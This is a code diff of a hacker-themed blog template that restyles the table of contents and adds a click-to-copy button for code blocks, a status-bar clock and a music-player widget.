-        padding-right: 10px;
-    }
-
-    .toc-header {
-        font-family: 'Courier New', monospace;
-        font-size: 11px; font-weight: bold; color: #00ff41;
-        margin-bottom: 15px; border-bottom: 1px solid rgba(0, 255, 65, 0.3);
-        padding-bottom: 5px; opacity: 0.8;
-    }
+    #cyber-back-btn { position: fixed; left: 20px; top: 130px; width: 260px; padding: 10px 15px; box-sizing: border-box; background: rgba(0, 0, 0, 0.8); border: 1px solid #00ff41; border-left: 5px solid #00ff41; color: #00ff41; font-family: 'Courier New', monospace; font-weight: bold; font-size: 14px; cursor: pointer; z-index: 95; transition: all 0.3s ease; backdrop-filter: blur(5px); text-transform: uppercase; letter-spacing: 1px; }
+    #cyber-back-btn:hover { background: rgba(0, 255, 65, 0.2); box-shadow: 0 0 15px rgba(0, 255, 65, 0.4); padding-left: 25px; }
+    #hackmd-toc-wrapper { position: fixed; left: 20px; top: 180px; width: 260px; max-height: calc(100vh - 200px); overflow-y: auto; z-index: 90; background: transparent; padding-right: 10px; }
+    .toc-header { font-family: 'Courier New', monospace; font-size: 11px; font-weight: bold; color: #00ff41; margin-bottom: 15px; border-bottom: 1px solid rgba(0, 255, 65, 0.3); padding-bottom: 5px; opacity: 0.8; }
     #hackmd-toc-content ul { list-style: none; padding: 0; margin: 0; border-left: 2px solid rgba(255, 255, 255, 0.1); }
     #hackmd-toc-content li { margin: 0; position: relative; }
     .toc-link { display: block; text-decoration: none; color: #888; font-size: 13px; padding: 5px 0 5px 15px; line-height: 1.5; transition: all 0.2s ease; border-left: 2px solid transparent; margin-left: -2px; }
     .toc-link:hover { color: #fff; }
     .toc-link.active { color: #00ff41 !important; font-weight: 500; border-left: 2px solid #00ff41; background: linear-gradient(90deg, rgba(0, 255, 65, 0.05), transparent); }
     .toc-item.h1 { padding-left: 0; } .toc-item.h1 .toc-link { font-weight: bold; font-size: 14px; color: #ccc; }
-    .toc-item.h2 { padding-left: 0; }
-    .toc-item.h3 .toc-link { padding-left: 30px; font-size: 12px; }
-    .toc-item.h4 .toc-link { padding-left: 45px; font-size: 11px; opacity: 0.8; }
-    #hackmd-toc-wrapper::-webkit-scrollbar { width: 3px; }
-    #hackmd-toc-wrapper::-webkit-scrollbar-thumb { background: #333; }
+    .toc-item.h2 { padding-left: 0; } .toc-item.h3 .toc-link { padding-left: 30px; font-size: 12px; } .toc-item.h4 .toc-link { padding-left: 45px; font-size: 11px; opacity: 0.8; }
+    #hackmd-toc-wrapper::-webkit-scrollbar { width: 3px; } #hackmd-toc-wrapper::-webkit-scrollbar-thumb { background: #333; }
+    @media screen and (max-width: 1450px) { #hackmd-toc-wrapper, #cyber-back-btn { display: none !important; } }
+</style>
+
+
+<script>
+    
+    function initCodeCopy() {
+        
+        const codeBlocks = document.querySelectorAll('.highlight');
+
+        codeBlocks.forEach(block => {
+            
+            if (block.querySelector('.cyber-copy-btn')) return;
+
+            
+            if (getComputedStyle(block).position === 'static') {
+                block.style.position = 'relative';
+            }
+
+            
+            const btn = document.createElement('button');
+            btn.className = 'cyber-copy-btn';
+            btn.innerHTML = '<span>COPY</span>'; 
+            
+            
+            btn.addEventListener('click', () => {
+                
+                const clone = block.cloneNode(true);
+                
+                
+                const lineNums = clone.querySelectorAll('.ln, .lnt, .lntd:first-child');
+                lineNums.forEach(el => el.remove());
+                
+                
+                const codeText = clone.innerText.trim();
+
+                navigator.clipboard.writeText(codeText).then(() => {
+                    btn.innerHTML = '<span style="color:#fff">COPIED!</span>';
+                    btn.classList.add('copied');
+                    setTimeout(() => {
+                        btn.innerHTML = '<span>COPY</span>';
+                        btn.classList.remove('copied');
+                    }, 2000);
+                });
+            });
+
+            block.appendChild(btn);
+        });
+    }
+</script>
+
+<style>
+     
+     
+    .ln, .lnt, .lntd:first-child { 
+        display: none !important; 
+        width: 0 !important;
+        padding: 0 !important;
+        user-select: none;
+    }
+    
+     
+    .lntd:last-child { 
+        width: 100% !important; 
+        padding-left: 0 !important;
+    }
+    
+     
+    .lntable { 
+        width: 100% !important; 
+        display: block !important; 
+    }
+    .lntable tbody, .lntable tr, .lntable td { 
+        display: block !important; 
+        width: 100% !important; 
+    }
 
      
-    @media screen and (max-width: 1450px) {
-        #hackmd-toc-wrapper, #cyber-back-btn { display: none !important; }
+    .cyber-copy-btn {
+        position: absolute;
+        top: 0;
+        right: 0;
+        z-index: 10;
+        background: rgba(0, 255, 65, 0.1);
+        border: none;
+        border-bottom-left-radius: 5px;
+        border-left: 1px solid #00ff41;
+        border-bottom: 1px solid #00ff41;
+        color: #00ff41;
+        font-family: 'Courier New', monospace;
+        font-size: 11px;
+        font-weight: bold;
+        padding: 5px 10px;
+        cursor: pointer;
+        opacity: 0;  
+        transition: all 0.3s ease;
     }
+
+     
+    .highlight:hover .cyber-copy-btn {
+        opacity: 1;
+    }
+
+    .cyber-copy-btn:hover {
+        background: #00ff41;
+        color: #000;
+    }
+
+     
+    .post-content .highlight {
+        background: #0d1117 !important;  
+        border: 1px solid rgba(0, 255, 65, 0.3);
+        border-radius: 6px;
+        margin-bottom: 20px;
+        overflow: hidden;  
+    }
+    
+    .post-content pre {
+        padding: 15px !important;
+        margin: 0 !important;
+        background: transparent !important;
+        overflow-x: auto;  
+    }
+
+     
+    .post-content pre::-webkit-scrollbar { height: 6px; }
+    .post-content pre::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 3px; }
+    .post-content pre::-webkit-scrollbar-track { background: #1a1a1a; }
 </style>
 
 
 <style>
+     
     .post-single {
         background-color: rgba(0, 0, 0, 0.85) !important;
         backdrop-filter: blur(10px);
@@ -761,17 +648,14 @@ CWE List: <a href="https://cwe.mitre.org/">https://cwe.mitre.org/</a>.</p>
         z-index: 1;
     }
     @media screen and (min-width: 1451px) {
-        .post-single {
-            margin-left: 300px !important;
-            width: calc(100% - 300px) !important;
-            max-width: 1000px;
-        }
+        .post-single { margin-left: 300px !important; width: calc(100% - 300px) !important; max-width: 1000px; }
         .main { max-width: 1600px !important; margin: auto; }
     }
-    .post-content { color: #e0e0e0; }
-    .post-content pre { border: 1px solid rgba(0, 255, 65, 0.4); background: #0d1117 !important; }
+    .post-content { color: #e0e0e0; font-family: 'Segoe UI', sans-serif; }
+    .profile img { border-radius: 50% !important; border: 3px solid #00ff41 !important; box-shadow: 0 0 25px rgba(0, 255, 65, 0.4) !important; background: #000; transition: transform 0.3s ease; }
+    .profile img:hover { transform: scale(1.05) rotate(5deg); box-shadow: 0 0 50px rgba(0, 255, 65, 0.9) !important; }
+    .art-widget, .cyber-panel, .avatar-wrapper-hud { display: none !important; }
 </style>
-
 
 <script>
     function initStatusBar() {
@@ -780,12 +664,7 @@ CWE List: <a href="https://cwe.mitre.org/">https://cwe.mitre.org/</a>.</p>
         if (header) {
             const statusBar = document.createElement('div');
             statusBar.id = 'system-status-bar';
-            statusBar.innerHTML = `
-                <div class="status-content">
-                    <div class="status-item"><span class="label">SYSTEM:</span> <span class="value">ONLINE</span></div>
-                    <div class="status-clock"><span id="sb-hour">00</span><span class="blink">:</span><span id="sb-min">00</span><span class="blink">:</span><span id="sb-sec">00</span></div>
-                    <div class="status-item"><span class="label">DATE:</span> <span class="value" id="sb-date">LOADING...</span></div>
-                </div>`;
+            statusBar.innerHTML = `<div class="status-content"><div class="status-item"><span class="label">SYSTEM:</span> <span class="value">ONLINE</span></div><div class="status-clock"><span id="sb-hour">00</span><span class="blink">:</span><span id="sb-min">00</span><span class="blink">:</span><span id="sb-sec">00</span></div><div class="status-item"><span class="label">DATE:</span> <span class="value" id="sb-date">LOADING...</span></div></div>`;
             header.parentNode.insertBefore(statusBar, header.nextSibling);
             function updateTime() {
                 const now = new Date();
@@ -807,21 +686,17 @@ CWE List: <a href="https://cwe.mitre.org/">https://cwe.mitre.org/</a>.</p>
 </style>
 
 
-<style>
-    .profile img { border-radius: 50% !important; border: 3px solid #00ff41 !important; box-shadow: 0 0 25px rgba(0, 255, 65, 0.4) !important; background: #000; transition: transform 0.3s ease; }
-    .profile img:hover { transform: scale(1.05) rotate(5deg); box-shadow: 0 0 50px rgba(0, 255, 65, 0.9) !important; }
-    .art-widget, .cyber-panel, .avatar-wrapper-hud { display: none !important; }
-</style>
-
 <script src="https://cdn.jsdelivr.net/npm/pjax/pjax.js"></script>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
 <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
 <div id="aplayer-fixed"></div>
 
 <script>
+    
     function initAllWidgets() {
         initStatusBar();
         generateHackMDTOC();
+        initCodeCopy(); 
     }
 
     document.addEventListener('DOMContentLoaded', () => {
